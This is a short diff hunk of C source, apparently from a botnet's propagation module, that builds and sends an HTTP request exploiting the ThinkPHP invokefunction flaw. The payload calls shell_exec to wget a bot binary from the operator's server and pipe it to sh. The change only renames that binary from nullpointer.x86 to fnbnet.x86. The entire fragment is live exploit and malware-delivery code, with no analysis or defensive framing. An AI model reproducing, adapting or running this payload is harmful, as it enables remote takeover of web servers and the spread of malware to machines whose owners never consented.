@@ -192,7 +192,7 @@ void thinkphp_init(void)
 				if (conn->state == THINKPHP_SC_EXPLOIT_STAGE2) {
 					struct in_addr ia; ia.s_addr = SERVIP;
 					snprintf(conn->payload_buf, sizeof(conn->payload_buf),
-						"GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://%s/bins/nullpointer.x86 -O - | sh' HTTP/1.1\r\nConnection: keep-alive\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
+						"GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://%s/bins/fnbnet.x86 -O - | sh' HTTP/1.1\r\nConnection: keep-alive\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
 						inet_ntoa(ia));
 					send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
 					util_zero(conn->payload_buf, sizeof(conn->payload_buf));
